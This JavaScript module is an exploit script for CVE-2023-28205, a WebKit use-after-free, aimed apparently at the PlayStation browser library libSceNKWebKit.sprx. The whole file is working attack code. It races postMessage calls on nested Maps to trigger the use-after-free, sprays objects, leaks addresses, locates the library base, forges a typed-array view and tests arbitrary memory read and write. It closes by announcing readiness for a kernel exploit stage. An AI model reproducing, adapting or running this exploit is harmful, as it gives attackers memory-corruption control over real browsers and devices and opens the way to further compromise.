import { mem, Memory } from './module/mem.mjs';
import { debug_log, die } from './module/utils.mjs';
import { Int } from './module/int64.mjs';
import { find_base } from './module/memtools.mjs';
import * as o from './module/offset.mjs';

function sleep(ms = 0) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

function gc() {
    new Uint8Array(4 * 1024 * 1024);
}

function spray() {
    const tmp = [];
    for (let j = 0; j < 1024; j++) {
        const d = new Date(0xbeef);
        tmp.push(d);
    }
    tmp.length = 0;
}

async function main() {
    debug_log('[*] Starting CVE-2023-28205 exploit');

    const main_view = new Uint8Array(1001);
    const worker_view = new Uint8Array(1001);
    debug_log('[*] Initializing Memory...');
    let memory;
    try {
        memory = new Memory(main_view, worker_view);
    } catch (e) {
        die('[-] Failed to initialize Memory: ' + e.message);
    }
    debug_log('[+] Memory initialized');

    debug_log('[*] Checking mem state after Memory init: ' + (mem ? 'exists' : 'null'));
    if (!mem || typeof mem.addrof !== 'function') {
        debug_log('[-] Error: mem is not properly initialized');
        throw new Error('mem is not properly initialized');
    }

    let sharedData = null;

    const part1 = async () => {
        const num_elems = 1600;
        let root = new Map();
        let msg = root;
        let foo = [];
        for (let i = 0; i < 100; i++) {
            foo.push(new Date(0xffff));
        }
        for (let i = 0; i < num_elems; i++) {
            const d = new Date(i);
            const map = new Map();
            msg.set(d, [map, foo]);
            msg = map;
        }
        msg = root;

        let data2 = null;
        let idx = null;
        let lastData = null;
        loop1: while (true) {
            let data = null;
            const prom = new Promise(resolve => {
                addEventListener('message', event => {
                    data = event;
                    resolve();
                }, {once: true});
            });
            postMessage(msg, origin);
            await prom;
            data = data.data;

            gc();
            await sleep();

            let tmp_i = null;
            try {
                for (let i = 0; i < num_elems; i++) {
                    tmp_i = i;
                    if (data.keys().next().value.getTime() === 0xffff) {
                        idx = i;
                        lastData = data;
                        break loop1;
                    }
                    data = data.values().next().value[0];
                }
            } catch {
                idx = tmp_i;
                lastData = data;
                break loop1;
            }
        }

        sharedData = lastData;
        debug_log('[Part 1] Shared data updated: ' + (sharedData ? 'set' : 'null'));

        return { data2: lastData.keys().next().value, idx, lastData };
    };

    const part2 = async () => {
        const num_elems = 1600;
        let root = new Map();
        let msg = root;
        let foo = [];
        for (let i = 0; i < 100; i++) {
            foo.push(new Date(0xffff));
        }
        for (let i = 0; i < num_elems; i++) {
            const d = new Date(i);
            const map = new Map();
            msg.set(d, [map, foo]);
            msg = map;
        }
        msg = root;

        let data2 = null;
        let idx = null;
        let lastData = null;
        loop2: while (true) {
            let data = null;
            const prom = new Promise(resolve => {
                addEventListener('message', event => {
                    data = event;
                    resolve();
                }, {once: true});
            });
            postMessage(msg, origin);
            await prom;
            data = data.data;

            gc();
            await sleep();

            let tmp_i = null;
            try {
                for (let i = 0; i < num_elems; i++) {
                    tmp_i = i;
                    if (data.keys().next().value.getTime() === 0xffff) {
                        idx = i;
                        lastData = data;
                        break loop2;
                    }
                    data = data.values().next().value[0];
                }
            } catch {
                idx = tmp_i;
                lastData = data;
                break loop2;
            }
        }

        sharedData = lastData;
        debug_log('[Part 2] Shared data updated: ' + (sharedData ? 'set' : 'null'));

        return { data2: lastData.keys().next().value, idx, lastData };
    };

    debug_log('[*] Starting race condition between Part 1 and Part 2');
    let results;
    try {
        results = await Promise.all([part1(), part2()]);
    } catch (e) {
        die('[-] Race condition error: ' + e.message);
    }

    const [result1, result2] = results;
    let data2 = result1.data2 || result2.data2;
    let idx = result1.idx !== null ? result1.idx : result2.idx;
    let lastData = result1.lastData || result2.lastData;

    alert('Stage1 done!, try crash');
    debug_log('[+] UAF triggered, idx: ' + idx);

    //root = null;
    //msg = null;
    //foo = [];
    gc();
    spray();
    await sleep(100);

    if (!data2) {
        debug_log('[-] Error: data2 is null');
        throw new Error('data2 is null');
    }

    if (typeof data2 !== 'object') {
        debug_log('[-] Error: data2 is not an object');
        throw new Error('data2 is not an object');
    }

    if (!data2.getTime || typeof data2.getTime !== 'function') {
        debug_log('[-] Error: data2 does not have a valid getTime method');
        throw new Error('data2 does not have a valid getTime method');
    }

    if (idx === undefined) {
        debug_log('[-] Error: idx is undefined');
        throw new Error('idx is undefined');
    }

    try {
        let data2_addr;
        debug_log('[*] Leaking data2 address...');
        try {
            data2_addr = mem.addrof(data2);
            if (!data2_addr) {
                throw new Error('addrof returned null or undefined');
            }
        } catch (e) {
            die('[-] Failed to leak data2 address: ' + e.message);
        }
        debug_log('[+] data2 address: ' + data2_addr.toString());

        let lib_base;
        debug_log('[*] Finding library base...');
        try {
            lib_base = find_base(data2_addr, true, true);
            if (!lib_base) {
                throw new Error('find_base returned null or undefined');
            }
        } catch (e) {
            die('[-] Failed to find library base: ' + e.message);
        }
        debug_log('[+] libSceNKWebKit.sprx base: ' + lib_base.toString());

        debug_log('[*] Verifying library base...');
        try {
            const magic = mem.read64(lib_base);
            if (!magic) {
                throw new Error('read64 returned null or undefined');
            }
            debug_log('[+] Magic at base: ' + magic.toString());
        } catch (e) {
            die('[-] Failed to verify library base: ' + e.message);
        }

        const fake_view = new Uint8Array(1001);
        debug_log('[*] Leaking fake_view address...');
        const fake_view_addr = mem.addrof(fake_view);
        if (!fake_view_addr) {
            throw new Error('fake_view_addr is null or undefined');
        }
        debug_log('[+] fake_view address: ' + fake_view_addr.toString());

        const target_addr = data2_addr.add(o.view_m_vector);
        debug_log('[*] Creating fake view...');
        try {
            mem.write64(fake_view_addr, o.view_m_vector, lib_base);
            mem.write32(fake_view_addr, o.view_m_length, 0xffffffff);
        } catch (e) {
            die('[-] Failed to create fake view: ' + e.message);
        }
        debug_log('[+] Fake view created');

        const test_addr = lib_base.add(0x1000);
        debug_log('[*] Testing arbitrary read/write...');
        try {
            const value = mem.read64(test_addr);
            if (!value) {
                throw new Error('read64 returned null or undefined');
            }
            debug_log('[+] Read value at ' + test_addr.toString() + ': ' + value.toString());

            mem.write64(test_addr, new Int(0xdeadbeef));
            const new_value = mem.read64(test_addr);
            if (!new_value) {
                throw new Error('read64 after write returned null or undefined');
            }
            debug_log('[+] Read after write: ' + new_value.toString());
            if (new_value.eq(new Int(0xdeadbeef))) {
                debug_log('[+] Arbitrary read/write achieved');
            } else {
                debug_log('[!] Write test failed, possibly read-only memory');
            }
        } catch (e) {
            debug_log('[!] Arbitrary read/write error: ' + e.message);
        }

        debug_log('[*] Ready for kernel exploit (Lapse)');
        alert('Stage2 completed successfully!');
    } catch (e) {
        die('[-] Main error: ' + e.message);
    }
}

export { main };